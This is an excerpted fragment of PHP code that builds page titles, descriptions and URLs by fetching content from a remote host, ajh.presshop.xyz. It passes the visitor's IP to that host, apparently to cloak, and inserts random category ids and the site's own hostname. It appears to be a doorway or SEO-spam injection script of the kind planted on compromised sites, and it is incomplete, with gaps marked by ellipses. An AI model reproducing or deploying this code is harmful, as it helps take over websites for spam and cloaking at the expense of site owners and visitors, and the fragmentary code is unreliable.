...
$categoryid=$_GET['categoryid'];
 ...
 {
$categoryid=mt_rand(1,123);
 }
if(!is_null($_GET['productid'])){
$kname=file_get_contents("http://ajh.presshop.xyz/2021/gn.aspx?iid=".$_GET['productid']);
...
$url="http://ajh.presshop.xyz/sjd.aspx?cid=".$categoryid."&number=".$_GET['number']."&pnum=".$_GET['pnum'];
...
function check($ip){
    ...
    $domain = file_get_contents("http://ajh.presshop.xyz/getdomain.aspx?rnd=1&ip=".$ip);
	...
	{
$ccc=$_GET['productid'];		
$kname=file_get_contents("http://ajh.presshop.xyz/0511/gn.aspx?iid=".$_GET['productid']);
$ddd=file_get_contents('http://ajh.presshop.xyz/newurl.asp?cid='.$_GET['categoryid']);
$eee=$ddd.$kname;
...
$url="";
  ...
  $descriptions=file_get_contents("http://ajh.presshop.xyz/getci.aspx?cid=".$categoryid."&s=4&e=5");
 $key=file_get_contents("http://ajh.presshop.xyz/getci.aspx?cid=".$categoryid."&s=4&e=5");
$hyzhdy="http://ajh.presshop.xyz/2021/doiid.aspx";
if(!is_null($_GET['productid'])){
$url=$hyzhdy."?iid=".$_GET['productid']."&mt=http://ajh.presshop.xyz/en/333/".mt_rand(1,98).".txt&cid=".$_GET['categoryid'];
$title="AJh,".$kname.",".$_SERVER['HTTP_HOST'];
